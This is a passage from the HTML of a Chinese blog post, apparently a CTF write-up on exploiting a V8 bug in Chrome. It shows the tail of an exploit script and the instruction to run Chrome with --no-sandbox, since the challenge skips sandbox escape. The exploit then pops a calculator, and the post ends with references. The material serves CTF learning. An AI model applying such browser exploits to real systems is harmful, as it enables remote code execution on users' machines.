+</span></span><span style=display:flex><span>f();
+</span></span><span style=display:flex><span>&lt;/<span style=color:#062873;font-weight:700>script</span>&gt;
+</span></span></code></pre></div><p>直接起 chrome 会触发沙盒，无法执行 execve，本题本身不考察沙盒绕过，所以用无沙盒模式启动就可以了，即</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>./chrome --no-sandbox
+</span></span></code></pre></div><p>拖入 exp，即可弹出计算器</p><p><img src=https://www.cjovi.icu/usr/uploads/2021/11/3294311080.png alt=弹出计算器！></p><h3 id=reference>reference</h3><blockquote><p><a href=https://www.xi4oyu.top/3b546c3b>小语的 wp</a></p><p><a href=https://www.anquanke.com/post/id/256679>关于 map</a></p></blockquote></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/v8>v8</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
+<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
